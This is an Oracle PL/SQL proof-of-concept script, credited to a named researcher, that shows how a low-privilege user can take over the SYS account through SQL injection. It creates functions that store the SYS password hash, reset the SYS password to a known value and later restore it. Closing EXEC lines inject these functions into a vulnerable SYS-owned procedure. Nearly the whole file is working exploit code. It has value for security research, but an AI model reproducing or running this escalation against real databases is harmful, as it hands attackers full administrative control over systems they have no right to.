/*
  Advanced SQL Injection in Oracle databases
  Becoming the SYS user with SQL Injection.
  This script creates functions that can be injected to replace the password of the SYS user and to restore it to the   original value.

  By Esteban Martinez Fayo
  secemf@yahoo.com.ar
*/
------------
-- Execute this as a low privilege user
------------

--This table is optional if you don't want to save the old SYS password
CREATE TABLE "SCOTT"."PSW_DATA" ("USERNAME" VARCHAR2(32 byte) NOT NULL, "PSW_HASH" VARCHAR2(30 byte) NOT NULL);

CREATE OR REPLACE  FUNCTION "SCOTT"."SQLI_CHANGEPSW"  return varchar2
 authid current_user as
 pragma autonomous_transaction;
 ROW_COUNT NUMERIC;
 PSW VARCHAR2(30);
BEGIN
  EXECUTE IMMEDIATE 'SELECT COUNT(*) FROM SCOTT.PSW_DATA' INTO ROW_COUNT;
  IF (ROW_COUNT <= 0) THEN
    EXECUTE IMMEDIATE 'INSERT INTO SCOTT.PSW_DATA select username, password from dba_users where username=''SYS''';
    EXECUTE IMMEDIATE 'ALTER USER SYS IDENTIFIED BY newpsw';
  END IF;
  COMMIT;
  RETURN '';
END;
/

CREATE OR REPLACE  FUNCTION "SCOTT"."SQLI_RESTOREPSW" return varchar2
 authid current_user as
 pragma autonomous_transaction;
  PSW_HASH VARCHAR2(30);
BEGIN
  EXECUTE IMMEDIATE 'SELECT PSW_HASH FROM SCOTT.PSW_DATA WHERE USERNAME = ''SYS''' INTO PSW_HASH;
  EXECUTE IMMEDIATE 'ALTER USER SYS IDENTIFIED BY VALUES ''' || PSW_HASH || '''';
  EXECUTE IMMEDIATE 'DELETE FROM SCOTT.PSW_DATA where username=''SYS''';
  COMMIT;
  RETURN '';
END;
/


-- SYS.SQLIVULN is a procedure vulnerable to SQL Injection. The vulnerability exists
-- in a single PL/SQL statement (not in an anonymous PL/SQL block).
-- See file SQLInjectionLimitation.sql
-- To change the SYS password execute:
EXEC SYS.SQLIVULN('MANAGER''||SCOTT.SQLI_CHANGEPSW()||''');

-- To restore the SYS password execute:
EXEC SYS.SQLIVULN('MANAGER''||SCOTT.SQLI_RESTOREPSW()||''');
